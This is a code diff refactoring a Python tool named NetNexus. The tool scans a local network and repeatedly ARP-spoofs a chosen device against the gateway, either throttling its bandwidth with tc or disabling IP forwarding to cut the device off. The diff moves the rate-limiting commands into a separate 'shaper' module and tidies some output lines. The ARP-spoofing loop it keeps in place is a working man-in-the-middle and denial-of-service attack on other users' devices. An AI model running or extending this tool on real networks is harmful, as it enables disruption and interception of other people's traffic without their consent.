@@ -1,6 +1,6 @@
 import scapy.all as scapy
 import os, time, sys, subprocess, threading
-from core import scanner, spoof
+from core import scanner, spoof, shaper
 
 device_memory = {}
 stop_scanner = False
@@ -12,10 +12,6 @@ def set_forwarding(state):
     else:
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
-
-def apply_limit(iface, kbps):
-    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
-    subprocess.run(["sudo", "tc", "qdisc", "add", "dev", iface, "root", "tbf", "rate", f"{kbps}kbit", "latency", "50ms", "burst", "1540"], check=True)
 
 def background_scanner(ip_range):
     global device_memory, stop_scanner
@@ -39,7 +35,7 @@ def main():
     while True:
         os.system('clear')
         print("="*60)
-        print("          NetNexus (Live Refresh)")
+        print("          NetNexus")
         print("="*60)
         print("ID\tIP\t\tMAC\t\t\tNAME")
         print("-" * 60)
@@ -65,21 +61,22 @@ def main():
             if mode == "1":
                 kbps = input("kbps: ")
                 set_forwarding(True)
-                apply_limit(iface, kbps)
+                shaper.apply_limit(iface, kbps)
                 wait_time = 0.5
             elif mode == "2":
                 set_forwarding(False)
                 wait_time = 0.05
-            else: continue
+            else:
+                continue
 
-            print(f"[*] Active on {target['ip']}... Ctrl+C to stop.")
+            print(f"[*] Active on {target['ip']}...")
             while True:
                 spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                 time.sleep(wait_time)
                 
         except (KeyboardInterrupt, ValueError, IndexError):
             set_forwarding(True)
-            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
+            shaper.reset_shaper(iface)
             spoof.restore(target['ip'], gateway_ip)
             continue
 
